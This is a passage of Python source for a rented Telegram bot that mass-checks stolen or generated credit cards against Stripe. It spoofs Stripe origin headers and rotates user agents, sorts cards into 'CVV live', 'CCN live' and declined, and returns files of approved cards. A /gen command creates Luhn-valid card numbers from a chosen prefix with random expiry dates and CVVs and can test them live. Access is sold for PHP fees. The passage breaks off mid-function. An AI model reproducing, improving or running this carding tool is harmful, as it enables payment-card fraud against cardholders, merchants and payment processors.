def generate_uuids():
    return {"gu": str(uuid.uuid4()), "mu": str(uuid.uuid4()), "si": str(uuid.uuid4())}

def prepare_headers():
    """Generate random user agent with better rotation"""
    try:
        if ua is not None:
            user_agent = ua.random
        else:
            user_agent = random.choice(FALLBACK_USER_AGENTS)
    except Exception as e:
        user_agent = random.choice(FALLBACK_USER_AGENTS)
    
    return {
        'user-agent': user_agent,
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'accept-language': 'en-US,en;q=0.9',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors'
    }

def format_card_display(card, current_index, total_cards):
    """Format card display in x/y - card details format"""
    try:
        card_parts = card.split('|')
        if len(card_parts) >= 4:
            number = card_parts[0]
            exp_month = card_parts[1]
            exp_year = card_parts[2]
            cvv = card_parts[3]
            return f"{current_index}/{total_cards} - {number}|{exp_month}|{exp_year}|{cvv}"
    except:
        pass
    return f"{current_index}/{total_cards} - {card}"

def update_progress_message_sync(user_session):
    if not user_session.get("checking", False):
        return
    
    try:
        stats = user_session["stats"]
        current = user_session["current_index"]
        total = user_session["stats"]["total"]
        chat_id = user_session["chat_id"]
        task_id = user_session["task_id"]
        
        current_card_info = None
        if user_session["current_card_info"]:
            current_card = user_session["current_card_info"]["card"]
            current_card_info = {
                "display": format_card_display(current_card, current, total)
            }
        
        counts = {
            'status': 'Running',
            'cvv_live': stats['cvv_live'],
            'ccn_live': stats['ccn_live'],
            'declined': stats['declined'],
            'total': total,
            'current': current
        }
        
        # More descriptive progress message
        progress_percentage = (current / total) * 100 if total > 0 else 0
        progress_message = f"🔄 Processing... {current}/{total} ({progress_percentage:.1f}%)"
        
        if user_session["message_id"]:
            response = edit_telegram_message_sync(
                progress_message, 
                chat_id, 
                user_session["message_id"],
                reply_markup=build_keyboard(task_id, counts, current_card_info)
            )
            # If message editing fails (message not found), send a new one
            if response and response.status_code != 200:
                response = send_telegram_message_sync(
                    progress_message, 
                    chat_id,
                    reply_markup=build_keyboard(task_id, counts, current_card_info)
                )
                if response and response.status_code == 200:
                    data = response.json()
                    user_session["message_id"] = data['result']['message_id']
        else:
            response = send_telegram_message_sync(
                progress_message, 
                chat_id,
                reply_markup=build_keyboard(task_id, counts, current_card_info)
            )
            if response and response.status_code == 200:
                data = response.json()
                user_session["message_id"] = data['result']['message_id']
    except Exception as e:
        logger.error(f"Error updating progress: {e}")

def send_final_results_sync(user_session):
    try:
        stats = user_session["stats"]
        total = stats["total"]
        chat_id = user_session["chat_id"]
        task_id = user_session["task_id"]
        
        final_counts = {
            'status': 'Completed',
            'cvv_live': stats['cvv_live'],
            'ccn_live': stats['ccn_live'],
            'declined': stats['declined'],
            'total': total,
            'current': total
        }
        
        final_message = "✅ Processing Completed"
        
        if user_session["message_id"]:
            edit_telegram_message_sync(
                final_message, 
                chat_id, 
                user_session["message_id"],
                reply_markup=build_keyboard(task_id, final_counts, None)
            )
        else:
            send_telegram_message_sync(
                final_message, 
                chat_id,
                reply_markup=build_keyboard(task_id, final_counts, None)
            )
    except Exception as e:
        logger.error(f"Error sending final results: {e}")

async def safe_send_message(update: Update, text: str, parse_mode='HTML', reply_markup=None):
    """Safely send message with timeout handling"""
    try:
        await update.message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"Error sending message: {e}")

async def check_access(update: Update):
    """Check if user is authorized"""
    user_id = str(update.effective_user.id)
    if not is_authorized(user_id):
        hours, minutes = get_rental_time_left(user_id)
        if hours > 0 or minutes > 0:
            await safe_send_message(
                update,
                f"🚫 <b>Rental Expired</b>\n\n"
                f"Your rental access has expired.\n"
                f"Contact @mcchiatoos to renew your access."
            )
        else:
            await safe_send_message(
                update,
                "🚫 <b>Access Denied</b>\n\n"
                "You are not authorized to use this bot.\n\n"
                " <b>Rental Options:</b>\n"
                "• 2Weeks Access - 350\n"
                "• 1Month Access - 500 PHP\n"
                "• 3Months Access - 3K PHP\n\n"
                "Contact @mcchiatoos for rental access."
            )
        return False
    return True

# FIXED: Handle stop button callback with better thread safety
async def handle_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle stop button callback - preserve statistics display and send approved cards file"""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    if callback_data.startswith('stop_masschk_'):
        task_id = callback_data.replace('stop_masschk_', '')
        
        for chat_id, session in user_sessions.items():
            if session.get('task_id') == task_id:
                if session["checking"]:
                    session["checking"] = False
                    
                    stats = session["stats"]
                    total = stats["total"]
                    
                    # MODIFIED: Get approved cards from processor before stopping
                    approved_cards = []
                    if session.get("processor"):
                        approved_cards = session["processor"].get_approved_cards()
                        session["processor"].stop_processing()
                    
                    final_counts = {
                        'status': 'Stopped',
                        'cvv_live': stats['cvv_live'],
                        'ccn_live': stats['ccn_live'],
                        'declined': stats['declined'],
                        'total': total,
                        'current': session["current_index"]
                    }
                    
                    stopped_message = "🛑 Processing Stopped"
                    
                    await query.edit_message_text(
                        text=stopped_message,
                        parse_mode='HTML',
                        reply_markup=build_keyboard(task_id, final_counts, session.get("current_card_info"))
                    )
                    
                    # NEW: Send approved cards file after stopping
                    if approved_cards:
                        send_approved_cards_file(session, approved_cards)
                    
                    return
                else:
                    await query.answer("No active checking session found!", show_alert=True)
                    return
        
        await query.answer("Session not found!", show_alert=True)

async def handle_noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle noop callback (do nothing)"""
    query = update.callback_query
    await query.answer()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command"""
    await safe_send_message(
        update,
        " <b>Mang Biroy AUTH</b>\n\n"
        "📁 <b>Send cc.txt file with cards to check.</b>\n\n"
        "Format:\n<code>card|mm|yy|cvv</code>\n\n"
        "Use /cmds to see all commands\n"
        "DM @mcchiatoos for any problem"
    )

# FIXED: Stop command with better session management
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /stop command"""
    if not await check_access(update):
        return
        
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    
    if user_session["checking"]:
        user_session["checking"] = False
        
        # NEW: Get approved cards before stopping
        approved_cards = []
        if user_session.get("processor"):
            approved_cards = user_session["processor"].get_approved_cards()
            user_session["processor"].stop_processing()
        
        await safe_send_message(update, "🛑 Checking stopped!")
        
        # NEW: Send approved cards file
        if approved_cards:
            send_approved_cards_file(user_session, approved_cards)
    else:
        await safe_send_message(update, "❌ No active checking session!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /stats command"""
    if not await check_access(update):
        return
        
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    
    if user_session["checking"]:
        stats = user_session["stats"]
        current = user_session["current_index"]
        total = stats["total"]
        
        with active_users_lock:
            active_count = active_users_count
        
        await safe_send_message(
            update,
            f" <b>Current Stats</b>\n\n"
            f"✅ CVV Live: {stats['cvv_live']}\n"
            f"✅ CCN Live: {stats['ccn_live']}\n"
            f"❌ Declined: {stats['declined']}\n"
            f"🔄 Progress: {current}/{total}\n"
            f"👥 Active Users: {active_count}\n"
            f" Total: {total}"
        )
    else:
        await safe_send_message(update, "❌ No active checking session!")

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /myaccess command"""
    user_id = str(update.effective_user.id)
    
    if user_id in AUTHORIZED_USERS:
        await safe_send_message(
            update,
            "✅ <b>Permanent Access</b>\n\n"
            "You have permanent access to this bot."
        )
    elif user_id in USER_RENTALS:
        expiry_time = USER_RENTALS[user_id]
        current_time = datetime.now().timestamp()
        
        if current_time < expiry_time:
            days, hours, minutes = get_rental_time_left_detailed(expiry_time)
            
            time_left_parts = []
            if days > 0:
                time_left_parts.append(f"{days} day{'s' if days != 1 else ''}")
            if hours > 0:
                time_left_parts.append(f"{hours} hour{'s' if hours != 1 else ''}")
            if minutes > 0:
                time_left_parts.append(f"{minutes} minute{'s' if minutes != 1 else ''}")
            
            time_left_str = ", ".join(time_left_parts)
            
            await safe_send_message(
                update,
                f" <b>Rental Access</b>\n\n"
                f" <b>Time Left:</b> {time_left_str}\n\n"
                f"Contact @mcchiatoos to renew"
            )
        else:
            await safe_send_message(
                update,
                "🚫 <b>Rental Expired</b>\n\n"
                "Your rental access has expired.\n"
                "Contact @mcchiatoos to renew your access."
            )
    else:
        await safe_send_message(
            update,
            "🚫 <b>No Access</b>\n\n"
            "You don't have access to this bot.\n\n"
            " <b>Rental Options:</b>\n"
            "• 2Weeks Access - 350\n"
            "• 1Month Access - 500 PHP\n"
            "• 3Months Access - 3K PHP\n\n"
            "Contact @mcchiatoos for rental access."
        )

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /bin command for BIN lookup"""
    if not await check_access(update):
        return
        
    if not context.args:
        await safe_send_message(
            update,
            "❌ <b>Usage:</b> /bin [BIN]\n\n"
            "Example: <code>/bin 411111</code>"
        )
        return
        
    bin_number = context.args[0].strip()
    
    if not bin_number.isdigit() or len(bin_number) != 6:
        await safe_send_message(
            update,
            "❌ <b>Invalid BIN</b>\n\n"
            "Please provide a valid 6-digit BIN number.\n"
            "Example: <code>/bin 411111</code>"
        )
        return
    
    await safe_send_message(update, "🔍 <b>Looking up BIN information...</b>")
    
    try:
        bin_info = fetch_bin_info(bin_number + "000000")
        
        bin_message = f""" <b>BIN Info Result</b>

<b>BIN:</b> {bin_info['BIN']}
<b>Brand:</b> {bin_info['Brand']}
<b>Type:</b> {bin_info['Type']}
<b>Level:</b> {bin_info['Level']}
<b>Bank:</b> {bin_info['Bank']}
<b>Country:</b> {bin_info['Country']} {bin_info['Emoji']}"""
        
        await safe_send_message(update, bin_message)
        
    except Exception as e:
        logger.error(f"Error in BIN lookup: {e}")
        await safe_send_message(
            update,
            "❌ <b>Error looking up BIN</b>\n\n"
            "Please try again later."
        )

async def active_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /active command to show active users"""
    if not await check_access(update):
        return
        
    with active_users_lock:
        active_count = active_users_count
        active_users = [session for session in user_sessions.values() if session.get("active")]
    
    if active_users:
        user_list = []
        for session in active_users:
            user_info = await get_user_info(session["chat_id"])
            progress = f"{session['current_index']}/{session['stats']['total']}"
            user_list.append(f"👤 {user_info} -  {progress}")
        
        await safe_send_message(
            update,
            f"👥 <b>Active Users</b>\n\n"
            f"Total Active: {active_count}\n\n"
            + "\n".join(user_list)
        )
    else:
        await safe_send_message(update, "🔍 <b>No active users currently checking.</b>")

async def system_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show system status and performance metrics"""
    if not await check_access(update):
        return
        
    with active_users_lock:
        active_count = active_users_count
        active_users = [session for session in user_sessions.values() if session.get("active")]
    
    system_info = f"""🖥️ <b>System Status</b>

👥 <b>Active Users:</b> {active_count}/{MAX_CONCURRENT_USERS}
⚙️ <b>Global Workers:</b> {GLOBAL_MAX_WORKERS}
👤 <b>User Workers:</b> {USER_MAX_WORKERS}
⏱️ <b>Request Timeout:</b> {REQUEST_TIMEOUT}s
📊 <b>Max Cards:</b> {MAX_CARDS_LIMIT}

💡 <b>Performance Tips:</b>
• System optimized for {MAX_CONCURRENT_USERS} concurrent users
• Each user gets {USER_MAX_WORKERS} parallel workers
• Non-blocking architecture prevents delays
• Queue-based processing ensures fairness"""
    
    if active_users:
        user_list = []
        for session in active_users:
            user_info = await get_user_info(session["chat_id"])
            progress = f"{session['current_index']}/{session['stats']['total']}"
            user_list.append(f"• {user_info} - {progress} cards")
        
        system_info += f"\n\n<b>Active Sessions:</b>\n" + "\n".join(user_list)
    
    await safe_send_message(update, system_info)

# FIXED: gen_command with better error handling
async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /gen command for generating cards with custom prefix, optional CVV, and live checking"""
    if not await check_access(update):
        return
        
    if not context.args:
        await safe_send_message(
            update,
            " <b>Card Generator</b>\n\n"
            " <b>Usage:</b> /gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file]\n\n"
            " <b>Examples:</b>\n"
            "<code>/gen 411111 |10|29 10</code> - Generate 10 cards with random CVV\n"
            "<code>/gen 5362577102 |05|28 25</code> - Generate 25 cards with random CVV\n"
            "<code>/gen 371449 |12|27|123 100</code> - Generate 100 cards with custom CVV 123\n"
            "<code>/gen 411111 |10|29|rnd 50 check</code> - Generate 50 cards with random CVV and check live\n"
            "<code>/gen 5362477102 |rnd|rnd|900 300 file</code> - Generate 300 cards with random month/year, fixed CVV 900\n"
            "<code>/gen 411111 |rnd|rnd|rnd 100</code> - Generate 100 cards with random month/year/CVV\n\n"
            " <b>Max:</b> 500 cards per generation\n"
            " <b>All cards include Luhn validation</b>\n"
            " <b>Options:</b>\n"
            "• <b>check</b> - Generate and immediately check if cards are live\n"
            "• <b>file</b> - Generate and save to file (default behavior)\n"
            "• <b>none</b> - Just generate and send as file\n\n"
            " <b>Special:</b> Use 'rnd' for random month, year, or CVV"
        )
        return
    
    # Join all arguments to handle the custom format
    full_args = ' '.join(context.args)
    
    # Parse the custom format: CUSTOM_PREFIX |mm|yy|cvv amount [check/file]
    # Try format with CVV first (including rnd for CVV)
    pattern_with_cvv = r'^(\d+)\s*\|(\d{1,2}|rnd)\|(\d{2,4}|rnd)\|(\d{3,4}|rnd)\s*(\d+)(?:\s+(check|file))?$'
    # Try format without CVV
    pattern_without_cvv = r'^(\d+)\s*\|(\d{1,2}|rnd)\|(\d{2,4}|rnd)\s*(\d+)(?:\s+(check|file))?$'
    
    match = re.match(pattern_with_cvv, full_args)
    has_cvv = True
    
    if not match:
        match = re.match(pattern_without_cvv, full_args)
        has_cvv = False
    
    if not match:
        await safe_send_message(
            update,
            "❌ <b>Invalid format!</b>\n\n"
            "✅ <b>Usage:</b> /gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file]\n\n"
            " <b>Examples:</b>\n"
            "<code>/gen 411111 |10|29 10</code> - Without CVV (random CVV)\n"
            "<code>/gen 5362577102 |05|28|123 25</code> - With custom CVV\n"
            "<code>/gen 371449 |12|27|rnd 100 check</code> - Check live with random CVV\n"
            "<code>/gen 5362477102 |rnd|rnd|900 300 file</code> - Save to file\n"
            "<code>/gen 411111 |rnd|rnd|rnd 50</code> - Random month/year/CVV\n\n"
            "• CUSTOM_PREFIX: 4-15 digits (starting numbers of the card)\n"
            "• mm: Month (1-12) or 'rnd' for random\n" 
            "• yy: Year (2 or 4 digits) or 'rnd' for random\n"
            "• cvv: 3-4 digits or 'rnd' for random (optional - random if not provided)\n"
            "• amount: 1-500 cards\n"
            "• check/file: (optional) 'check' to test live, 'file' to save as file (default: file)"
        )
        return
    
    if has_cvv:
        custom_prefix = match.group(1)
        exp_month_input = match.group(2)
        exp_year_input = match.group(3)
        custom_cvv_input = match.group(4)  # This can be digits or 'rnd'
        amount_str = match.group(5)
        action = match.group(6)  # 'check', 'file', or None
        
        # Handle CVV input - if 'rnd', set to None for random generation
        if custom_cvv_input.lower() == 'rnd':
            custom_cvv = None
            cvv_display = "Random"
        else:
            custom_cvv = custom_cvv_input
            cvv_display = custom_cvv
    else:
        custom_prefix = match.group(1)
        exp_month_input = match.group(2)
        exp_year_input = match.group(3)
        amount_str = match.group(4)
        action = match.group(5)  # 'check', 'file', or None
        custom_cvv = None  # No CVV provided
        cvv_display = "Random"
    
    # Default action is 'file' if not specified
    if action is None:
        action = 'file'
    
    # Validate custom prefix
    if not custom_prefix.isdigit() or len(custom_prefix) < 4 or len(custom_prefix) > 15:
        await safe_send_message(
            update,
            "❌ <b>Invalid custom prefix!</b>\n\n"
            "Custom prefix must be 4-15 digits\n\n"
            "Examples:\n"
            "• <code>/gen 411111 |10|29 10</code> - 6-digit prefix\n"
            "• <code>/gen 5362577102 |05|28 25</code> - 10-digit prefix\n"
            "• <code>/gen 371449123456 |12|27 100</code> - 12-digit prefix"
        )
        return
    
    # Handle month (either fixed or random)
    random_month = False
    if exp_month_input.lower() == 'rnd':
        random_month = True
        exp_month_display = "Random"
    else:
        try:
            exp_month_int = int(exp_month_input)
            if exp_month_int < 1 or exp_month_int > 12:
                raise ValueError("Invalid month")
            exp_month = f"{exp_month_int:02d}"  # Format as 2 digits
            exp_month_display = exp_month
        except ValueError:
            await safe_send_message(
                update,
                "❌ <b>Invalid expiry month!</b>\n\n"
                "Month must be between 01-12 or 'rnd' for random\n\n"
                "Example: <code>/gen 411111 |10|29 10</code> or <code>/gen 411111 |rnd|29 10</code>"
            )
            return
    
    # Handle year (either fixed or random)
    random_year = False
    if exp_year_input.lower() == 'rnd':
        random_year = True
        exp_year_display = "Random"
    else:
        try:
            exp_year_int = int(exp_year_input)
            if len(exp_year_input) == 2:
                # Convert 2-digit year to 4-digit (assume 2000s)
                exp_year_int = 2000 + exp_year_int
            elif len(exp_year_input) == 4:
                # Already 4-digit year
                pass
            else:
                raise ValueError("Invalid year format")
            
            current_year = datetime.now().year
            if exp_year_int < current_year or exp_year_int > current_year + 10:
                await safe_send_message(
                    update,
                    f"⚠️ <b>Expiry year warning!</b>\n\n"
                    f"Year {exp_year_int} seems unrealistic.\n"
                    f"Current year: {current_year}\n\n"
                    f"Continue anyway?"
                )
                # Continue despite warning
            
            exp_year = str(exp_year_int)
            exp_year_display = exp_year_input
        except ValueError:
            await safe_send_message(
                update,
                "❌ <b>Invalid expiry year!</b>\n\n"
                "Year must be 2 or 4 digits or 'rnd' for random\n\n"
                "Examples:\n"
                "<code>/gen 411111 |10|29 10</code> - for 2029\n"
                "<code>/gen 411111 |10|2029 10</code> - also for 2029\n"
                "<code>/gen 411111 |10|rnd 10</code> - random year"
            )
            return
    
    # Validate custom CVV if provided (and not 'rnd')
    if custom_cvv is not None and custom_cvv != 'rnd':
        if not custom_cvv.isdigit():
            await safe_send_message(
                update,
                "❌ <b>Invalid CVV!</b>\n\n"
                "CVV must be 3-4 digits or 'rnd' for random\n\n"
                "Examples:\n"
                "<code>/gen 411111 |10|29|123 10</code> - 3-digit CVV\n"
                "<code>/gen 371449 |12|27|1234 10</code> - 4-digit CVV for Amex\n"
                "<code>/gen 411111 |10|29|rnd 10</code> - Random CVV"
            )
            return
        
        # Validate CVV length based on card type
        if custom_prefix.startswith('3'):  # Amex
            if len(custom_cvv) != 4:
                await safe_send_message(
                    update,
                    "❌ <b>Invalid CVV for Amex!</b>\n\n"
                    "Amex cards require 4-digit CVV\n\n"
                    "Example: <code>/gen 371449 |12|27|1234 10</code>"
                )
                return
        else:  # Visa, MasterCard, Discover
            if len(custom_cvv) != 3:
                await safe_send_message(
                    update,
                    "❌ <b>Invalid CVV for Visa/MasterCard!</b>\n\n"
                    "Visa/MasterCard cards require 3-digit CVV\n\n"
                    "Example: <code>/gen 411111 |10|29|123 10</code>"
                )
                return
    
    # Validate amount
    try:
        amount = int(amount_str)
        if amount <= 0:
            raise ValueError("Amount must be positive")
        if amount > 500:
            amount = 500
            await safe_send_message(
                update,
                f"⚠️ <b>Amount limited to 500 cards</b>\n"
                f"Generating 500 cards instead of {amount_str}"
            )
    except ValueError:
        await safe_send_message(
            update,
            "❌ <b>Invalid amount!</b>\n\n"
            "Amount must be a number between 1-500\n\n"
            "Example: <code>/gen 411111 |10|29 50</code>"
        )
        return
    
    # Determine card length based on custom prefix
    if custom_prefix.startswith('3'):  # Amex
        card_length = 15
    else:  # Visa, MasterCard, Discover
        card_length = 16
    
    # Check if custom prefix is too long for card length
    if len(custom_prefix) >= card_length:
        await safe_send_message(
            update,
            f"❌ <b>Custom prefix too long!</b>\n\n"
            f"Your prefix has {len(custom_prefix)} digits but {card_length}-digit cards can only have up to {card_length-1} digits before the check digit.\n\n"
            f"Please use a shorter prefix (max {card_length-1} digits)."
        )
        return
    
    action_display = "Check live" if action == 'check' else "Save to file"
    
    await safe_send_message(
        update,
        f"🔄 <b>Generating {amount} cards...</b>\n\n"
        f" <b>Custom Prefix:</b> {custom_prefix}\n"
        f" <b>Expiry Month:</b> {exp_month_display}\n"
        f" <b>Expiry Year:</b> {exp_year_display}\n"
        f" <b>CVV:</b> {cvv_display}\n"
        f" <b>Card Length:</b> {card_length} digits\n"
        f" <b>Amount:</b> {amount}\n"
        f" <b>Luhn Validation:</b> Enabled\n"
        f" <b>Action:</b> {action_display}\n\n"
        f"Please wait..."
    )
    
    try:
        # Generate cards
        generated_cards = generate_cards(custom_prefix, amount, card_length)
        
        if not generated_cards:
            await safe_send_message(
                update,
                "❌ <b>Failed to generate cards!</b>\n\n"
                "Please check your custom prefix and try again."
            )
            return
        
        # Create card strings with specified expiry and CVV
        cards_with_details = []
        
        for card in generated_cards:
            # Generate random month if requested
            if random_month:
                exp_month_actual, _, _ = generate_random_expiry()
            else:
                exp_month_actual = exp_month
            
            # Generate random year if requested
            if random_year:
                _, _, exp_year_actual_2d = generate_random_expiry()
            else:
                exp_year_actual_2d = exp_year[-2:]  # Use 2-digit year
            
            # Generate random CVV if not provided or if 'rnd' is specified
            if custom_cvv is None:
                if custom_prefix.startswith('3'):  # Amex - 4 digit CVV
                    random_cvv = str(random.randint(1000, 9999))
                else:  # Visa/MasterCard - 3 digit CVV
                    random_cvv = str(random.randint(100, 999))
                card_string = f"{card}|{exp_month_actual}|{exp_year_actual_2d}|{random_cvv}"
            else:
                # Use the same custom CVV for all cards
                card_string = f"{card}|{exp_month_actual}|{exp_year_actual_2d}|{custom_cvv}"
            
            cards_with_details.append(card_string)
        
        # Save to file (always create the file for both options)
        filename = f"generated_{custom_prefix}_{amount}.txt"
        with open(filename, 'w') as f:
            for card in cards_with_details:
                f.write(card + '\n')
        
        # Handle different actions
        if action == 'check':
            # Check if system can handle more users
            if not can_accept_new_user():
                await safe_send_message(
                    update,
                    "🚫 <b>System Busy</b>\n\n"
                    "Too many users are currently checking cards.\n"
                    "Please try again in a few minutes or use 'file' option instead.\n\n"
                    f"Max concurrent users: {MAX_CONCURRENT_USERS}"
                )
                # Clean up file
                try:
                    os.remove(filename)
                except:
                    pass
                return
            
            # Start live checking the generated cards
            await safe_send_message(
                update,
                f" <b>Starting live check for {len(cards_with_details)} generated cards...</b>"
            )
            
            # Create a user session for checking
            chat_id = update.message.chat_id
            user_session = get_user_session(chat_id)
            
            if user_session["checking"]:
                await safe_send_message(update, "❌ Please stop current checking first using /stop")
                # Clean up file
                try:
                    os.remove(filename)
                except:
                    pass
                return
            
            # Initialize session with generated cards
            user_session.update({
                "checking": True,
                "cards": cards_with_details,
                "current_index": 0,
                "stats": {
                    "cvv_live": 0,
                    "ccn_live": 0,
                    "declined": 0,
                    "total": len(cards_with_details)
                },
                "start_time": time.time(),
                "message_id": None,
                "chat_id": chat_id,
                "current_card_info": None,
                "task_id": str(uuid.uuid4())[:8],
                "processor": None,
                "active": False
            })
            
            initial_counts = {
                'status': 'Starting...',
                'cvv_live': 0,
                'ccn_live': 0,
                'declined': 0,
                'total': len(cards_with_details),
                'current': 0
            }
            
            response = send_telegram_message_sync(
                "🔍 Checking generated cards...", 
                chat_id,
                reply_markup=build_keyboard(user_session["task_id"], initial_counts, None)
            )
            if response and response.status_code == 200:
                data = response.json()
                user_session["message_id"] = data['result']['message_id']
            
            # Start checking in background using global thread pool
            future = global_thread_pool.submit(checking_thread, user_session)
            
            with active_users_lock:
                active_count = active_users_count
            
            await safe_send_message(
                update,
                f"✅ Generated {len(cards_with_details)} cards and started live check!\n"
                f"👥 Active users: {active_count + 1}/{MAX_CONCURRENT_USERS}\n"
                f"⚡ System optimized for multi-user performance\n"
                f"Use /stats to see progress."
            )
            
        else:  # action == 'file' or default
            # Send file to user without live check
            cvv_info = "Random CVV for each card" if custom_cvv is None else f"Fixed CVV: {custom_cvv}"
            month_info = "Random month for each card" if random_month else f"Fixed month: {exp_month_display}"
            year_info = "Random year for each card" if random_year else f"Fixed year: {exp_year_display}"
            
            with open(filename, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=filename,
                    caption=f"✅ <b>Generated {len(cards_with_details)} Cards</b>\n\n"
                           f" <b>Custom Prefix:</b> {custom_prefix}\n"
                           f" <b>Expiry Month:</b> {month_info}\n"
                           f" <b>Expiry Year:</b> {year_info}\n"
                           f" <b>CVV:</b> {cvv_info}\n"
                           f" <b>Card Length:</b> {card_length} digits\n"
                           f" <b>Amount:</b> {amount}\n"
                           f" <b>Luhn Validated:</b> Yes\n"
                           f" <b>Action:</b> Saved to file\n\n"
                           f"📁 <b>File:</b> {filename}\n\n"
                           f"💡 <i>Add 'check' at the end to test cards live</i>",
                    parse_mode='HTML'
                )
        
        # Clean up file after sending
        try:
            os.remove(filename)
        except:
            pass
            
    except Exception as e:
        logger.error(f"Error in gen_command: {e}")
        await safe_send_message(
            update,
            "❌ <b>Error generating cards!</b>\n\n"
            "Please try again with a different custom prefix."
        )
        
        # Clean up file in case of error
        try:
            if 'filename' in locals():
                os.remove(filename)
        except:
            pass

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /cmds command"""
    user_id = str(update.effective_user.id)
    
    message = "🤖 <b>Available Commands</b>\n\n"
    message += "📁 <b>Send cc.txt file</b> - Start checking\n"
    message += "/start - Start the bot\n"
    message += "/stop - Stop current checking\n"
    message += "/stats - Show current stats\n"
    message += "/myaccess - Check your access status\n"
    message += "/bin [BIN] - Look up BIN information\n"
    message += "/gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file] - Generate cards with optional CVV\n"
    message += "/active - Show active users\n"
    message += "/system - Show system status and performance\n"
    message += "/cmds - Show this help\n\n"
    
    if is_admin(user_id):
        message += "👑 <b>Admin Commands:</b>\n"
        message += "/adduser [user_id] - Add permanent user\n"
        message += "/addrental [user_id] [days] - Add rental\n"
        message += "/listusers - List all users\n"
        message += "/listrentals - List all rentals\n"
        message += "/listusers_with_names - List users with usernames\n"
        message += "/listrentals_with_names - List rentals with usernames\n"
        message += "/removeuser [user_id] - Remove user\n"
        message += "/removerental [user_id] - Remove rental\n\n"
    
    message += "💡 <b>System Features:</b>\n"
    message += f"• Supports {MAX_CONCURRENT_USERS} concurrent users\n"
    message += f"• Non-blocking architecture\n"
    message += f"• Queue-based card processing\n"
    message += f"• Optimized for multi-user performance\n\n"
    
    message += "DM @mcchiatoos for any problem"
    
    await safe_send_message(update, message)

# Admin commands
async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /adduser command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not context.args:
        await safe_send_message(update, "❌ Usage: /adduser [user_id]")
        return
        
    new_user_id = context.args[0]
    if new_user_id in AUTHORIZED_USERS:
        await safe_send_message(update, "❌ User already exists!")
        return
        
    AUTHORIZED_USERS.append(new_user_id)
    await safe_send_message(update, f"✅ User {new_user_id} added successfully!")

async def add_rental_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addrental command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if len(context.args) < 2:
        await safe_send_message(update, "❌ Usage: /addrental [user_id] [days]")
        return
        
    rental_user_id = context.args[0]
    try:
        days = int(context.args[1])
        expiry_time = add_rental(rental_user_id, days)
        
        await safe_send_message(
            update,
            f"✅ Rental added for user {rental_user_id}\n"
            f"📅 Duration: {days} day(s)"
        )
    except ValueError:
        await safe_send_message(update, "❌ Invalid days format!")

async def list_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listusers command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not AUTHORIZED_USERS:
        await safe_send_message(update, "❌ No authorized users!")
        return
        
    users_list = "\n".join(AUTHORIZED_USERS)
    await safe_send_message(
        update,
        f"👑 <b>Authorized Users</b>\n\n{users_list}"
    )

async def list_rentals_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listrentals command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not USER_RENTALS:
        await safe_send_message(update, "❌ No active rentals!")
        return
        
    rentals_list = []
    for rental_user_id, expiry_time in USER_RENTALS.items():
        days_left = get_rental_days_left(expiry_time)
        username = await get_user_info(rental_user_id)
        rentals_list.append(f"👤 {username} (ID: {rental_user_id}) - 📅 {days_left} days left")
    
    await safe_send_message(
        update,
        f"💳 <b>Active Rentals</b>\n\n" + "\n".join(rentals_list)
    )

async def list_users_with_names_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listusers_with_names command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not AUTHORIZED_USERS:
        await safe_send_message(update, "❌ No authorized users!")
        return
        
    users_list = []
    for user_id in AUTHORIZED_USERS:
        username = await get_user_info(user_id)
        users_list.append(f"👤 {username} (ID: {user_id})")
    
    await safe_send_message(
        update,
        f"👑 <b>Authorized Users with Names</b>\n\n" + "\n".join(users_list)
    )

async def list_rentals_with_names_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listrentals_with_names command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not USER_RENTALS:
        await safe_send_message(update, "❌ No active rentals!")
        return
        
    rentals_list = []
    for rental_user_id, expiry_time in USER_RENTALS.items():
        days_left = get_rental_days_left(expiry_time)
        username = await get_user_info(rental_user_id)
